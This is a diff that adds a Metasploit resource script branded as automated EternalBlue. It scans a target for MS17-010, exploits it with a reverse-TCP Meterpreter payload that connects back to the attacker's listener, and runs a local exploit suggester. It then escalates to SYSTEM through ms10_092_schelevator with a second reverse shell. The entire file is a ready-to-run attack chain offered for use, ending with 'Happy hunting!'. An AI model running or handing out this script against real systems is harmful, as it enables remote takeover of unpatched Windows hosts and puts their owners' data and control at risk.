@@ -1,0 +1,53 @@
+
+echo "
+        .-'--.
+       /    .'\\
+      |  .'   |
+     | ||_       _____  ____   _____
+    /||\\    | ____||  _ \\ | ____|
+     || === |||      |  |  | |) ||  _|
+     ||  o  |||      | |___ |  _ < | |___
+     ||/|||      |||| \\\\||
+     ||||||||||       (AUTOMATED ETERNALBLUE by Ali Ahmed)
+"
+
+# USER SETUP 
+setg RHOST 192.168.70.4
+setg LHOST 192.168.70.5
+setg LPORT 4444
+
+# SCAN FOR VULNERABILITY 
+echo "[*] Scanning RHOST for MS17-010 vulnerability..."
+use auxiliary/scanner/smb/smb_ms17_010
+run
+back
+
+#  EXPLOIT ETERNALBLUE 
+echo "[*] Launching EternalBlue exploit..."
+use exploit/windows/smb/ms17_010_eternalblue
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set EXITFUNC thread
+exploit -j
+sleep 10
+sessions -i 1
+getuid
+
+#  LOCAL EXPLOIT SUGGESTER 
+echo "[*] Running Local Exploit Suggester..."
+run post/multi/recon/local_exploit_suggester
+sleep 10
+background
+
+# PRIVILEGE ESCALATION 
+echo "[*] Attempting SYSTEM escalation using ms10_092_schelevator..."
+use exploit/windows/local/ms10_092_schelevator
+set SESSION 1
+set LHOST 192.168.70.5
+set LPORT 4445
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+exploit -j
+sleep 10
+sessions -i 2
+getuid
+
+echo "[*] If successful, you are now NT AUTHORITY\\SYSTEM. Happy hunting!"
